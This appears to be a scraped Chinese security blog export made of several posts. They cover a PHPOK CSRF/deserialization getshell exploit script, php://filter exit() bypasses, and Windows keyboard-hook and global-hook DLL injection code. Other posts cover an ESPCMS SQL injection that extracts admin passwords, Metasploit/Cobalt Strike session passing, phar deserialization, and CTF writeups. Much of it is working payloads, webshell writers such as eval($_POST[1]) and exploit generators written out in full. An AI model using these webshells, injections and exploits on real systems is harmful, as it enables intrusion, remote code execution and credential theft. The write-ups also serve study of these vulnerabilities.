绕过exit()save方法中使用了file_put_contents函数，第一个和第二个参数均可控，第二个参数前面拼接了&lt;?php exit();?&gt;使后面的php代码无法执行，可以通过php://filter伪协议使拼接的&lt;?php exit();?&gt;失效 来源于 基于php://filter协议对exit函数几种逃逸方法的分析 1.string.strip_tags该特性从PHP 7.3.0起废弃 &lt;?php exit()?&gt;本质是XML标签，可以使用strip_tags()函数去除它。为了防止我们写入的代码也被去除，需要把代码base64编码后写入 1234//1.php&lt;?phpfile_put_contents('php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php','&lt;?php exit();?&gt;'.$_GET['a']);?&gt; 将&lt;?php phpinfo();进行base64编码后提交 1http://localhost/test/1.php?a=PD9waHAgcGhwaW5mbygpOw== 写入成功 2.base64base64编码结果只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时(如&lt;、&gt;、?、;、(、)等)，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码，如&lt;?php exit();?&gt;就会先变成phpexit再进行解码，phpexit一共7个字符，而base64解码算法是4个byte一组，所以再在后面任意添加一位，比如a，这样就是phpexita再在后面接上一句话的base64编码，前面八位phpexita解码结果是乱码不会被执行，后面接着解码一句话的base64编码 1234//1.php&lt;?phpfile_put_contents('php://filter/write=convert.base64-decode/resource=shell.php','&lt;?php exit();?&gt;'.$_GET['a']);?&gt; 提交 1http://localhost/test/1.php?a=aPD9waHAgcGhwaW5mbygpOw== 3.rot13&lt;?php exit(); ?&gt;在经过rot13编码后会变成&lt;?cuc rkvg(); ?&gt;，在php不开启short_open_tag时，php不认识这个字符串，也就不会被执行，&lt;?php phpinfo();?&gt;经过rot13编码后的结果为&lt;?cuc cucvasb();?&gt; 提交 1http://localhost/test/1.php?a=&lt;?cuc cucvasb();?&gt; 反序列化由名称得知decode()为解密函数，encode()为加密函数，encode()调用serialize()，decode()中调用unserialize()，找到调用decode()处，把序列化后的恶意类用encode()加密再使用decode()解密并进行反序列化。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768class token_lib{ private $keyid = ''; private $keyc_length = 6; private $keya; private $keyb; private $time; private $expiry = 3600; public function keyid($keyid='') { if(!$keyid){ return $this-&gt;keyid; } $this-&gt;keyid = strtolower(md5($keyid)); $this-&gt;config(); return $this-&gt;keyid; } private function config() { if(!$this-&gt;keyid){ return false; } $this-&gt;keya = md5(substr($this-&gt;keyid, 0, 16)); $this-&gt;keyb = md5(substr($this-&gt;keyid, 16, 16)); } public function encode($string) { if(!$this-&gt;keyid){ return false; } $string = serialize($string);//序列化 $expiry_time = $this-&gt;expiry ? $this-&gt;expiry : 365*24*3600; $string = sprintf('%010d',($expiry_time + $this-&gt;time)).substr(md5($string.$this-&gt;keyb), 0, 16).$string; $keyc = substr(md5(microtime().rand(1000,9999)), -$this-&gt;keyc_length); $cryptkey = $this-&gt;keya.md5($this-&gt;keya.$keyc); $rs = $this-&gt;core($string,$cryptkey); return $keyc.str_replace('=', '', base64_encode($rs)); //return $keyc.base64_encode($rs); } public function decode($string) { if(!$this-&gt;keyid){ return false; } $string = str_replace(' ','+',$string); $keyc = substr($string, 0, $this-&gt;keyc_length); $string = base64_decode(substr($string, $this-&gt;keyc_length)); $cryptkey = $this-&gt;keya.md5($this-&gt;keya.$keyc); $rs = $this-&gt;core($string,$cryptkey); $chkb = substr(md5(substr($rs,26).$this-&gt;keyb),0,16); if((substr($rs, 0, 10) - $this-&gt;time &gt; 0) &amp;&amp; substr($rs, 10, 16) == $chkb){ $info = substr($rs, 26); return unserialize($info);//反序列化 } return false; } } encode()和decode()都要求keyid，全局搜索得到keyid来源于管理员设置的api_code 1$this-&gt;lib('token')-&gt;keyid($this-&gt;site['api_code']); CSRF在后台找到API验证串设置处 抓包后发现无csrf防护，构造请求诱导管理员访问即可 利用构造脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889&lt;?phpclass cache{ protected $key_id; protected $key_list; protected $folder; public function __construct(){ $this-&gt;key_id = 'shell'; $this-&gt;key_list = 'aa'.base64_encode('&lt;?php eval($_GET[&quot;shell&quot;]);?&gt;'); $this-&gt;folder = 'php://filter/write=convert.base64-decode/resource='; }}class token{ private $keyid = ''; private $keyc_length = 6; private $keya; private $keyb; private $time; private $expiry = 3600; public function keyid($keyid=''){ if(!$keyid){ return $this-&gt;keyid; } $this-&gt;keyid = strtolower(md5($keyid)); $this-&gt;config(); return $this-&gt;keyid; } private function config(){ if(!$this-&gt;keyid){ return false; } $this-&gt;keya = md5(substr($this-&gt;keyid, 0, 16)); $this-&gt;keyb = md5(substr($this-&gt;keyid, 16, 16)); } public function encode($string){ if(!$this-&gt;keyid){ return false; } $expiry_time = $this-&gt;expiry ? $this-&gt;expiry : 365*24*3600; $string = sprintf('%010d',($expiry_time + time())).substr(md5($string.$this-&gt;keyb), 0, 16).$string; $keyc = substr(md5(microtime().rand(1000,9999)), -$this-&gt;keyc_length); $cryptkey = $this-&gt;keya.md5($this-&gt;keya.$keyc); $rs = $this-&gt;core($string,$cryptkey); return $keyc.str_replace('=', '', base64_encode($rs)); //return $keyc.base64_encode($rs); } private function core($string,$cryptkey){ $key_length = strlen($cryptkey); $string_length = strlen($string); $result = ''; $box = range(0, 255); $rndkey = array(); // 产生密匙簿 for($i = 0; $i &lt;= 255; $i++){ $rndkey[$i] = ord($cryptkey[$i % $key_length]); } // 用固定的算法，打乱密匙簿，增加随机性，好像很复杂，实际上并不会增加密文的强度 for($j = $i = 0; $i &lt; 256; $i++){ $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; } // 核心加解密部分 for($a = $j = $i = 0; $i &lt; $string_length; $i++){ $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); } return $result; }}$token = new token();$token-&gt;keyid('123456');echo $token-&gt;encode(serialize(new cache));?&gt; 运行脚本得到payload ](https://imgbed.cn/preview?id=60208e5954a29f0001d1ddfb) 在index_cotrol.php中的phpok_f方法中发现调用decode 根据路由规则请求url,token为payload 1http://localhost/phpok/api.php?c=index&amp;f=phpok&amp;token=478ef7obit5nzTBxeDcrCXjGxB4ifLSKWvkWtVrpSmI9W4o0rjCDuphi5+PHD0vNqavv0lx0PQ+v/RfRV/CPv81ncmZb2RJy2eYWxxRII1wSLQ825xh7jrjXMPjbAZ6gUiAuCb2HSMz/vizU53Wfc64OIB/5FYAH0OcBENNyngihF9LNgQ5pxVQkf2EAvG0T7AbWMb6prp0ZTaZ19SbZdAeKV3AB8LApao8nODRRNLutAwh5k6MUefwjD9lU/Czv0n/UXAGlIl+asWwzpz6pMYfHTbIc5Byug4 利用成功 参考： https://xz.aliyun.com/t/7852 https://www.ghtwf01.cn/index.php/archives/985/ https://www.ghtwf01.cn/index.php/archives/981/ http://althims.com/2020/02/05/phpok-5-4-173/","link":"/2021/02/08/PHPOK-v5-5-csrf-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell%E5%88%86%E6%9E%90/"},{"title":"Windows钩子函数","text":"钩子原理​ Windows下的应用程序大部分是基于消息模式机制的，一些CUI程序不基于消息。Windows下应用程序都有一个消息函数，根据不同的消息来完成不同的功能。Windows提供的钩子机制是用来截获监视系统中的消息。不同的钩子可以处理不同信息。 ​ 钩子分为局部钩子和全局钩子。局部钩子是针对一个线程的，而全局钩子是针对整个操作系统内基于消息机制的应用程序的。全局钩子需要使用DLL文件，DLL文件里存放了钩子函数的代码。 ​ 安装全局钩子后，只要进程接收到可以发出钩子的消息后，全局钩子的DLL文件会被操作系统自动或强行的加载到该进程中。由此可见，设置消息钩子也是一种可以进行DLL注入的方法。 钩子函数钩子函数在系统消息触发时被系统调用 。在某个事件触发后，钩子函数捕获它并完成一些操作，是一段用以处理系统消息的程序 相关API函数123456LRESULT CALLBACK HookProc //所有的钩子函数都是这种形式( int nCode, WPARAM wParam, LPARAM lParam,); 参数nCode：钩子代码，钩子子程通过该代码来决定执行什么动作。该值取决于钩子的类型，每种类型都拥有自己特有的钩子代码集合。 参数wParam和lParam的值，都取决于钩子代码。但是一般都包含发送或者传递的消息的信息。 SetWindowsHookEx返回一个钩子句柄 123456HHOOK WINAPI SetWindowsHookEx( _In_ int idHook, _In_ HOOKPROC lpfn,//回调函数，名称任意，参数和返回值数据固定 _In_ HINSTANCE hMod,//为DllMain第一个参数g_Inst=(HMODULE)hModule; _In_ DWORD dwThreadId//全局钩子设置0); lpfn：指定HOOK函数的地址。如果dwThread参数被设置为0或者被设置为一个进程中的线程ID，则该回调HOOK函数只能在DLL文件中。如果dwThread为当前进程中的线程ID，则这个回调函数可以在当前进程中也可以在DLL中。 hMod：钩子函数所在模块的句柄。lpfn所在的模块的句柄，如果dwThreadId为当前进程中的线程ID，而且lpfn所指向的函数在当前进程中，那么hMod被设置为NULL dwThreadId：需要被挂钩的线程ID号（指定的话为局部钩子），如果设置为0表示在基于消息机制的所有的线程挂钩（全局钩子），如果指定为具体ID好，那么表示要在指定的线程中进行挂钩。这个参数影响上边两个参数的取值，决定了该钩子属于全局钩子还是局部钩子。 idHook:钩子的类型 UnhookWindowsEx移除先前用SetWindowsHookEx安装的钩子， 123BOOL UnhookWindowsHookEx( HHOOK hhk //钩子句柄); 可以多次反复安装钩子，而且可以安装多个同样类型的钩子。这样会形成一条钩子链，最后安装的钩子会首先截获到消息，当该钩子对消息处理完毕以后会选择返回，或者继续传递消息。通常情况下，为了消息可以传达到目标窗口，我们会选择将消息继续传递 CallNextHookEx使消息继续传递，第一个参数为钩子句柄，后面三个为钩子函数的参数 123456LRESULT CallNextHookEx( HHOOK hhk, int nCode, WPARAM wParam, LPARAM lParam); GetKeyNameTextGetKeyNameText函数检索表示键的名称的字符串。 12345int GetKeyNameTextA( LONG lParam,//钩子函数的第三个参数lparam LPSTR lpString,//接收的缓冲区 int cchSize//最大大小); 键盘钩子实例功能为用Messagebox显示按下键的字符。既然要截获键盘消息，那么肯定是截获系统范围内的键盘消息，因此需要安装全局钩子，这样就需要DLL文件支持。 首先新建DLL文件，定义两个导出函数和两个全局变量 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;#include &lt;Windows.h&gt;//定义导出函数，开始hook和结束hookextern &quot;C&quot; __declspec(dllexport) void SetHookOn();extern &quot;C&quot; __declspec(dllexport) void SetHookOff();HHOOK g_Hook = NULL;HINSTANCE g_Inst = NULL;//重写钩子函数//CallNextHookEx函数表示将当前钩子传递给钩子链中的下一个钩子//第一个参数当前钩子的句柄。如果直接返回0，则表示中断钩子传递//对钩子进行拦截LRESULT CALLBACK KeyboardProc( int code, WPARAM wParam, LPARAM lParam){//进入钩子函数的第一个判断，如果code&lt;0必须调用CallNextHookEx将消息继续传递下去，不对消息进行处理，并返回CallNextHookEx的返回值，MSDN要求。 if (code &lt; 0) { return CallNextHookEx(g_Hook, code, wParam, lParam); }//如果code等于HC_ACTION，表示消息中含有按键消息，如果为WM_KEYDOWN显示按键对应文本 if (code == HC_ACTION &amp;&amp; lParam &gt; 0) { TCHAR szBuf[MAXBYTE] = { 0 }; GetKeyNameText(lParam, szBuf, MAXBYTE); MessageBox(NULL, szBuf, NULL, MB_OK); } return CallNextHookEx(g_Hook, code, wParam, lParam);}void SetHookOn(){ g_Hook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_Inst, 0);}void SetHookOff(){ UnhookWindowsHookEx(g_Hook);}BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ){ g_Inst = (HMODULE)hModule; switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE;} 在DllMain函数中，需要保存该DLL模块的句柄，以方便安装全局钩子 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108// MFCKeyboardHookDlg.cpp: 实现文件//#include &quot;pch.h&quot;#include &quot;framework.h&quot;#include &quot;MFCKeyboardHook.h&quot;#include &quot;MFCKeyboardHookDlg.h&quot;#include &quot;afxdialogex.h&quot;#pragma comment(lib,&quot;KeyboardHook&quot;) extern &quot;C&quot; void SetHookOn();extern &quot;C&quot; void SetHookOff();#ifdef _DEBUG#define new DEBUG_NEW#endif// CMFCKeyboardHookDlg 对话框CMFCKeyboardHookDlg::CMFCKeyboardHookDlg(CWnd* pParent /*=nullptr*/) : CDialog(IDD_MFCKEYBOARDHOOK_DIALOG, pParent){ m_hIcon = AfxGetApp()-&gt;LoadIcon(IDR_MAINFRAME);}void CMFCKeyboardHookDlg::DoDataExchange(CDataExchange* pDX){ CDialog::DoDataExchange(pDX);}BEGIN_MESSAGE_MAP(CMFCKeyboardHookDlg, CDialog) ON_WM_PAINT() ON_WM_QUERYDRAGICON() ON_BN_CLICKED(IDC_BUTTON2, &amp;CMFCKeyboardHookDlg::OnBnClickedButton2) ON_BN_CLICKED(IDC_BUTTON1, &amp;CMFCKeyboardHookDlg::OnBnClickedButton1)END_MESSAGE_MAP()// CMFCKeyboardHookDlg 消息处理程序BOOL CMFCKeyboardHookDlg::OnInitDialog(){ CDialog::OnInitDialog(); // 设置此对话框的图标。 当应用程序主窗口不是对话框时，框架将自动 // 执行此操作 SetIcon(m_hIcon, TRUE); // 设置大图标 SetIcon(m_hIcon, FALSE); // 设置小图标 // TODO: 在此添加额外的初始化代码 return TRUE; // 除非将焦点设置到控件，否则返回 TRUE}// 如果向对话框添加最小化按钮，则需要下面的代码// 来绘制该图标。 对于使用文档/视图模型的 MFC 应用程序，// 这将由框架自动完成。void CMFCKeyboardHookDlg::OnPaint(){ if (IsIconic()) { CPaintDC dc(this); // 用于绘制的设备上下文 SendMessage(WM_ICONERASEBKGND, reinterpret_cast&lt;WPARAM&gt;(dc.GetSafeHdc()), 0); // 使图标在工作区矩形中居中 int cxIcon = GetSystemMetrics(SM_CXICON); int cyIcon = GetSystemMetrics(SM_CYICON); CRect rect; GetClientRect(&amp;rect); int x = (rect.Width() - cxIcon + 1) / 2; int y = (rect.Height() - cyIcon + 1) / 2; // 绘制图标 dc.DrawIcon(x, y, m_hIcon); } else { CDialog::OnPaint(); }}//当用户拖动最小化窗口时系统调用此函数取得光标//显示。HCURSOR CMFCKeyboardHookDlg::OnQueryDragIcon(){ return static_cast&lt;HCURSOR&gt;(m_hIcon);}void CMFCKeyboardHookDlg::OnBnClickedButton2(){ // TODO: 在此添加控件通知处理程序代码 SetHookOn();}void CMFCKeyboardHookDlg::OnBnClickedButton1(){ // TODO: 在此添加控件通知处理程序代码 SetHookOff();} 全局钩子DLL注入WH_GETMESSAGE：该钩子作用是监视被投递到消息队列的消息。也就是在调用GetMessage()或PeekMessage()函数时，函数从消息队列中获取一个消息后调用该钩子。 利用WH_GETMESSAGE可以将DLL文件注入到所有的基于消息机制的程序中，在需要DLL大范围注入到基于消息的进程中时可以使用这种方法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;#include &lt;Windows.h&gt;#include &lt;tchar.h&gt;#pragma warning(disable:4996)#pragma data_seg(&quot;mydata&quot;)HHOOK g_Hook = NULL; //必须赋初值，否则微软编译器会把没有初始化的数据放到普通的未初始化数据段中 //而不是放在shared中,从而导致多个进程之间的共享行为失败#pragma data_seg()#pragma comment(linker,&quot;/SECTION:mydata,RWS&quot;) extern &quot;C&quot; __declspec(dllexport) void SetHookOn();extern &quot;C&quot; __declspec(dllexport) void SetHookOff();HINSTANCE g_hInst;LRESULT CALLBACK GetMessageProc( int nCode, WPARAM wParam, LPARAM lParam){ MessageBox(NULL, L&quot;Hooked&quot;, L&quot;提示&quot;, MB_ICONWARNING | MB_OKCANCEL); return CallNextHookEx(g_Hook, nCode, wParam, lParam);}void SetHookOn(){ g_Hook=SetWindowsHookEx(WH_GETMESSAGE, GetMessageProc, g_hInst, 0);}void SetHookOff(){ UnhookWindowsHookEx(g_Hook);}BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ){ switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: { g_hInst = hModule; } case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE;}","link":"/2021/02/05/Windows%E9%92%A9%E5%AD%90%E5%87%BD%E6%95%B0/"},{"title":"","text":"espcms前台注入分析《代码审计 企业级Web代码安全架构》一书中出现的cms，14年的老版本出现的Insert型注入。漏洞位于前台提交订单处 /interface/order.php $ptitle和$tsn为可控变量，通过accept方法获取参数 12$ptitle = $this-&gt;fun-&gt;accept('ptitle', 'P');$tsn = $this-&gt;fun-&gt;accept('tsn', 'P'); /public/class_function.php处找到accept函数的定义，从$_GET和$_POST数组中获取内容，并使用daddslashes函数过滤。 查看daddslashes函数声明，首先判断gpc是否开启，未开启则开启gpc，当$string为数组或为字符串时，调用addslashes对函数进行过滤并返回过滤后的$string 第373行拼接并执行了sql语句，可控变量$tsn和$ptitle未经过任何过滤就拼接到了sql语句中,这个 $tsn 和 $did $ptitle 都是可控的变量,相当于 $_POST[XXX] ，$tsn 不为数组时取值就会变成 $tsn{x}的方式 ，$temp = “abc”$temp[0]的值为a。$tsn参数提交一个’，经过daddslashes转义后自动添加\\变成\\‘，取$tsn[0]为,可以利用这个来达到绕过转义的限制，来达到注入的目的。 正常请求的数据包，可以看到默认传递$ptitle[]和$tsn[]，%5B%5D为url编码后的[] 123456789101112131415POST /espcms/index.php?ac=order&amp;at=ordersave HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 541Origin: http://localhostConnection: closeReferer: http://localhost/espcms/index.php?ac=order&amp;at=orderpayCookie: cookieconsent_status=dismiss; Phpstorm-8e4b56ac=beb94186-86bf-4a9d-832a-863045cf4b2f; Hm_lvt_c12f88b5c1cd041a732dea597a5ec94c=1609381035; bdshare_firstime=1609381035017; Kffm_2132_saltkey=BgX15Dcg; Kffm_2132_lastvisit=1609472159; LankeMobile=p; ecisp_home_seccode=VneCeoRkPaRoYm1deaqUnow; ecisp_member_username=qtXCmg; ecisp_member_info=Z-LdZrRltZqompSolXLIpZqioo-c1J7eamZkZp2RbGxnbLVnZ2ZlaGKXbGxsspOclmObnm1nnJ6YaJtpb3Bnl2ZtYZTFb56abcJryJLGtJZkaJ2Wm51ka5yXmGhslGKRcJ9ybJObmpSWmW2TbseZ; PHPSESSID=fdcbb78c3f2f1dbfa3f269460137e63b; ecisp_order_list=l6CScLOnc2xvWJ5naFScmXNrcNysn2ScWpmamoicn3JmcHSocGlvU5POp66nqoN0zmuTc7Ku; ecisp_order_productmoney=aZiRZg; ecisp_order_sncode=aZ7CbZlpb25lm2lnamjDaXFpmZlxy2eXcWdlbpzHmJ4Upgrade-Insecure-Requests: 1userid=1&amp;productmoney=3200&amp;discount_productmoney=3200&amp;discountmoney=0&amp;tokenkey=85e30790ab01309cf9ba7c2cc40f03f8&amp;ptitle%5B%5D=HTC+Flyer+%E5%B9%B3%E6%9D%BF%E7%94%B5%E8%84%91&amp;tsn%5B%5D=SN20110830222536894&amp;bprice%5B%5D=3200.00&amp;oprice%5B%5D=3600.00&amp;did%5B%5D=27&amp;amount%5B%5D=1&amp;countprice%5B%5D=3200.00&amp;alias=rrr&amp;sex=0&amp;email=asdasd%40gmail.com&amp;tel=eeee&amp;mobile=eeee&amp;cityone=0&amp;citytwo=0&amp;citythree=0&amp;district=0&amp;address=eee&amp;zipcode=0&amp;sendtime=1&amp;osid=1&amp;opid=1&amp;content=&amp;invpayee=&amp;invcontent=&amp;submit=%E7%A1%AE%E8%AE%A4%E6%8F%90%E4%BA%A4%E8%AE%A2%E5%8D%95 正常提交执行的sql语句 1INSERT INTO espcms_order_info (oid,did,tsn,title,oprice,bprice,countprice,amount,inventory) VALUES (12,26,'','HTC S510e',3200,3100,3100,1,1) $tsn去掉[]后提交 \\ $ptitle[]提交 ,(SELECT CONCAT(USERNAME,0x2f,PASSWORD) FROM espcms_admin_member ),1,1,1,1,1)# ​ $tsn与$ptitle均有单引号包裹，拼接到sql语句中$tsn与$ptitle默认被当作数组处理，当$tsn为字符串时,尝试提交$tsn内容为‘，经过accept函数处理，daddslashes函数转义后$tsn为\\‘并拼接到sql语句中，原本包裹$tsn的后一个引号被转义，$tsn的前一个引号与$ptitle的前一个引号闭合，相当于$tsn实际内容为’\\‘,’ ​ 注入执行的sql语句如下 1INSERT INTO espcms_order_info (oid,did,tsn,title,oprice,bprice,countprice,amount,inventory) VALUES (12,36,'\\',',(SELECT CONCAT(USERNAME,0x2f,PASSWORD) FROM espcms_admin_member ),1,1,1,1,1)#',3200,3100,3100,1,1) 在提交订单时候用burpsuite抓包并修改 利用成功 参考： https://www.uedbox.com/post/25828/ https://www.seebug.org/vuldb/ssvid-94423","link":"/2021/01/06/espcms%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"},{"title":"msf和cs联动","text":"cs派生给msf配置好listener，选择Foreign HTTP 使用cs的spawn功能 msf设置payload为/windows/meterpreter/reverse_http，ip和端口与listener中的一致，不要使用64位的payload，会出现问题。这样即可接收到派生过来的session msf派生给cs只有meterpreter类型的session才能派生给cs 使用msf中的windows/local/payload_inject模块，设置payload为windows/meterpreter/reverse_http，ip和端口填写cs监听的ip和端口，再指定。设置iDisablePayloadHandler为true，因为payload_inject执行后会产生一个新的handler，但是我们已经有了一个，所以不需要它。执行后即可再cs中看到上线的机器。","link":"/2021/03/11/msf%E5%92%8Ccs%E8%81%94%E5%8A%A8/"},{"title":"phar反序列化学习","text":"phar文件结构分析 大体来说 Phar 结构由4部分组成 1.stub ：phar文件标识 12345&lt;?phpPhar::mapPhar();include 'phar://phar.phar/index.php';__HALT_COMPILER();?&gt; 可以理解为一个标志，格式为xxx&lt;?php xxx; __HALT_COMPILER();?&gt;，前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。也就是说如果我们留下这个标志位，构造一个图片或者其他文件，那么可以绕过上传限制，并且被 phar 这函数识别利用。 2. a manifest describing the contents phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。 3. the file contents 被压缩文件的内容。 4. [optional] a signature for verifying Phar integrity (phar file format only) 签名，放在文件末尾，格式如下 利用把一个序列化的对象，储存在phar格式的文件中，生成后的文件可以以任意格式保存，通过文件包含函数（下图），用phar://协议包含文件，就可以把对象反序列化。php中大部分文件函数在通过phar://解析phar文件时，会将meta-data进行反序列化，受影响的函数如下： 利用原理 12345678910&lt;?phpclass test{ public function __destruct() { echo 'destructed'; }}$filename='phar://phar.phar/test.txt';file_get_contents($filename);?&gt; 例题[GXYCTF2019]BabysqliV3.0利用思路：$this-&gt;Filename可控，从GET参数name中获取。Uploader类中的__toString()方法返回$this-&gt;Filename，最后的flie_get_contents参数实际可直接从name参数获取，这样就可以用phar://触发反序列化。此外还需要满足条件$this-&gt;token 等于$_SESSION['user']，$_SESSION['user']可从文件名中获得。最后构造phar://包含文件。 开始用弱口令admin password登陆 弱口令登陆进去，发现可以上传文件，但是没有给出返回路径，观察到file参数可能可以利用 只要参数中不以home和upload结尾就会自动把后缀名改成cc.fxxkyou! 利用php://filter读取文件源码 1http://bf4bee72-3946-49dc-b598-48b3dc0ac6aa.node3.buuoj.cn/home.php?file=php://filter/read=convert.base64-encode/resource=upload 123456789101112131415161718192021222324252627//home.php&lt;?phpsession_start();echo &quot;&lt;meta http-equiv=\\&quot;Content-Type\\&quot; content=\\&quot;text/html; charset=utf-8\\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;;error_reporting(0);if(isset($_SESSION['user'])){ if(isset($_GET['file'])){ if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET['file'])){ die(&quot;hacker!&quot;); } else{ if(preg_match(&quot;/home$/i&quot;, $_GET['file']) or preg_match(&quot;/upload$/i&quot;, $_GET['file'])){ $file = $_GET['file'].&quot;.php&quot;; } else{ $file = $_GET['file'].&quot;.fxxkyou!&quot;; } echo &quot;å½åå¼ç¨çæ¯ &quot;.$file; require $file; } } else{ die(&quot;no permission!&quot;); }}?&gt; 利用思路：$this-&gt;Filename可控，从GET参数name中获取。Uploader类中的__toString()方法返回$this-&gt;Filename，最后的flie_get_contents参数实际可直接从name参数获取，这样就可以用phar://触发反序列化。此外还需要满足条件$this-&gt;token 等于$_SESSION['user']，$_SESSION['user']可从文件名中获得。最后构造phar://包含文件。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374//upload.php&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; ä¸ä¼ æä»¶ &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;ä¸ä¼ &quot; /&gt;&lt;/form&gt;&lt;?phperror_reporting(0);class Uploader{ public $Filename; public $cmd; public $token; function __construct(){ $sandbox = getcwd().&quot;/uploads/&quot;.md5($_SESSION['user']).&quot;/&quot;; $ext = &quot;.txt&quot;; @mkdir($sandbox, 0777, true); if(isset($_GET['name']) and !preg_match(&quot;/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i&quot;, $_GET['name'])){ $this-&gt;Filename = $_GET['name']; } else{ $this-&gt;Filename = $sandbox.$_SESSION['user'].$ext; } $this-&gt;cmd = &quot;echo '&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;';&quot;; $this-&gt;token = $_SESSION['user']; } function upload($file){ global $sandbox; global $ext; if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename)){ $this-&gt;cmd = &quot;die('illegal filename!');&quot;; } else{ if($file['size'] &gt; 1024){ $this-&gt;cmd = &quot;die('you are too big (â²â½`ã)');&quot;; } else{ $this-&gt;cmd = &quot;move_uploaded_file('&quot;.$file['tmp_name'].&quot;', '&quot; . $this-&gt;Filename . &quot;');&quot;; } } } function __toString(){ global $sandbox; global $ext; // return $sandbox.$this-&gt;Filename.$ext; return $this-&gt;Filename; } function __destruct(){ if($this-&gt;token != $_SESSION['user']){ $this-&gt;cmd = &quot;die('check token falied!');&quot;; } eval($this-&gt;cmd); }}if(isset($_FILES['file'])) { $uploader = new Uploader(); $uploader-&gt;upload($_FILES[&quot;file&quot;]); if(@file_get_contents($uploader)){ echo &quot;ä¸é¢æ¯ä½ ä¸ä¼ çæä»¶ï¼&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;; echo file_get_contents($uploader); }}?&gt; 上传txt文件，得到$_SESSION[‘user’] 构造exp，生成phar文件并上传 12345678910111213141516171819202122&lt;?phpclass Uploader{ public $Filename; public $cmd='show_source(&quot;flag.php&quot;);'; public $token='GXY57eb0a54186eb32ad70deb2e3da0b903';}$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$a=new Uploader();$phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt; 读取flag 1http://dc0a112a-07ab-4130-a0cc-497b03dde141.node3.buuoj.cn/home.php?file=upload&amp;name=phar:///var/www/html/uploads/ef30d6288c320cd6e01dc95841a44ad0/GXY57eb0a54186eb32ad70deb2e3da0b903.txt","link":"/2021/03/25/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"},{"title":"nepctf部分wp","text":"little_trick长度限制rce 1234567891011&lt;?php error_reporting(0); highlight_file(__FILE__); $nep = $_GET['nep']; $len = $_GET['len']; if(intval($len)&lt;8 &amp;&amp; strlen($nep)&lt;13){ eval(substr($nep,0,$len)); }else{ die('too long!'); }?&gt; 传入负数即可绕过 直接echo写马 1http://node4.hackingfor.fun:34567/052e4d95576306a511b353cae5aec562/?len=-1&amp;nep=`$_GET[1]`;1&amp;1=echo \\&lt;?php eval\\(\\$_POST\\[1\\]\\)\\;&gt;2.php 实际执行命令 12345echo \\&lt;?php eval\\(\\$_POST\\[1\\]\\)\\;&gt;2.phpecho eval\\(&gt;&gt;2.phpecho \\$_POST&gt;&gt;2.phpecho \\[1\\]&gt;&gt;2.phpecho \\)\\;&gt;&gt;2.php 蚁剑连接拿到flag 梦回牡丹亭反序列化 1.Game类的__destruct方法调用checking 属性choice等于login类,属性username和password等于admin，属性register等于admin 2.login类的checking方法调用open，这些属性在Game类中赋值：属性file等于Open类，属性filename等于shell.php 3.最终执行open类的open方法 